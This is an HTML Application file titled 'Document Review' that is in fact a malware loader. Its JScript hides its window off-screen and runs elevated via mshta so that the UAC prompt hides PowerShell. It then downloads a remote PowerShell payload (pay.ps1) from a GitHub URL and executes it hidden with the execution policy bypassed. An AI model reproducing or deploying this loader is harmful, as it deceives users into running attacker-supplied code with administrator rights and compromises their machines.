<html>
<head>
<title>Document Review</title>
<HTA:APPLICATION
    ID="Loader"
    APPLICATIONNAME="DocumentReview"
    BORDER="none"
    CAPTION="no"
    CONTEXTMENU="no"
    INNERBORDER="no"
    MAXIMIZEBUTTON="no"
    MINIMIZEBUTTON="no"
    SCROLL="no"
    SELECTION="no"
    SHOWINTASKBAR="no"
    SINGLEINSTANCE="yes"
    SYSMENU="no"
    WINDOWSTATE="minimize" />
<script language="JScript">
// ---------------------------------------------------------------------------
// loader.hta - thin elevated wrapper.
//
// Launched by the shortcut via:
//     Start-Process mshta.exe "<this file>" -Verb RunAs
// so the UAC dialog identifies "Microsoft (R) HTML Application host" instead of
// "Windows PowerShell".
//
// Runs elevated (inherited from mshta). Stages pay.ps1 beside itself if it is
// not already present, runs it hidden, waits, logs to C:\Temp\loader.log.
//
// Staging deliberately uses powershell.exe + Invoke-WebRequest rather than
// WinHttp.WinHttpRequest.5.1: WinHTTP fails against hosts that negotiate TLS
// in ways it does not handle ("No credentials were available in the client
// certificate"), while IWR goes through .NET and is reliable.
// ---------------------------------------------------------------------------
(function () {
    var fso = new ActiveXObject("Scripting.FileSystemObject");
    var sh  = new ActiveXObject("WScript.Shell");

    var logDir     = "C:\\Temp";
    var logFile    = logDir + "\\loader.log";
    var payloadUrl = "https://raw.githubusercontent.com/paoladialcad-ship-it/file/refs/heads/main/pay.ps1";
    var psExe      = 'powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden ';

    try { if (!fso.FolderExists(logDir)) { fso.CreateFolder(logDir); } } catch (e) { }

    function log(msg) {
        try {
            var f = fso.OpenTextFile(logFile, 8, true);
            f.WriteLine("[" + new Date().toLocaleString() + "] " + msg);
            f.Close();
        } catch (e) { }
    }

    function selfPath() {
        var u = unescape(location.href);
        u = u.replace(/^file:\/\/\//i, "");
        return u.replace(/\//g, "\\");
    }

    function stagePayload(psPath) {
        var c = psExe + '-Command "Invoke-WebRequest \'' + payloadUrl + '\' ' +
                '-UseBasicParsing -OutFile \'' + psPath + '\'"';
        log("stage: " + c);
        return sh.Run(c, 0, true);
    }

    // keep the window out of sight even though it is minimised
    try { window.moveTo(-2000, -2000); window.resizeTo(0, 0); } catch (e) { }

    log("=== hta start ===");
    try {
        var me  = selfPath();
        var dir = fso.GetParentFolderName(me);
        var ps  = dir + "\\pay.ps1";
        log("self=" + me);

        if (!fso.FileExists(ps) || fso.GetFile(ps).Size < 1000) {
            log("pay.ps1 missing or too small - staging");
            var rc = stagePayload(ps);
            log("stage exit=" + rc);
        } else {
            log("pay.ps1 present bytes=" + fso.GetFile(ps).Size);
        }

        if (!fso.FileExists(ps)) {
            log("ABORT: pay.ps1 not staged");
        } else {
            log("pay.ps1 bytes=" + fso.GetFile(ps).Size);
            var cmd = psExe + '-File "' + ps + '"';
            log("exec " + cmd);
            var rc2 = sh.Run(cmd, 0, true);
            log("payload exit=" + rc2);
        }
    } catch (e) {
        log("ERROR " + e.message);
    }
    log("=== hta end ===");
    try { window.close(); } catch (e) { }
})();
</script>
</head>
<body></body>
</html>
